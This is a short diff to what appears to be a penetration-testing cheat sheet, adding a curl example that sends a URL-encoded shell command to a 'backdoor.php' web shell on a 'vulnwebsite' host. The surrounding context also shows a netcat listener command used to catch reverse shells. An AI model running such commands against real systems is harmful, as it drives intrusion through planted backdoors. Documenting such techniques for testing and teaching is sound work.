@@ -16,6 +16,7 @@ nc -nvlp PortAtt
 
 - https://en.wikipedia.org/wiki/Percent-encoding
 - https://www.urlencoder.io/
+- With curl: `curl http://vulnwebsite/backdoor.php --data-urlencode "cmd=ls -l"`
 
 ## Powershell
 
